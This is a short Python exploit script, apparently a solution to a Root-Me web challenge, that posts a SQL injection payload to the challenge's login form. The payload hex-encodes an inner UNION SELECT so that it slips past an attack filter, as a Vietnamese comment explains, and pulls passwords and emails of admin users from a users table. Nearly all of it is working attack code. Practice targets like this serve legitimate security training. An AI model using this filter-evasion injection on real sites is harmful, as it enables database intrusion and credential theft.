import requests

url = 'http://challenge01.root-me.org/web-serveur/ch49/index.php'

params = {'action':'search'}

# Ta encode query 2 thành hex để bypass filter(attack detect!)(SQL đọc hiểu được hex)
payload = "' UNION SELECT 0x" + ("' UNION SELECT password,email FROM users WHERE email LIKE '%admin%'-- -".encode('utf-8')).hex() + "-- -"

data = {'login':payload}

r = requests.post(url, params=params, data=data)

print(r.text)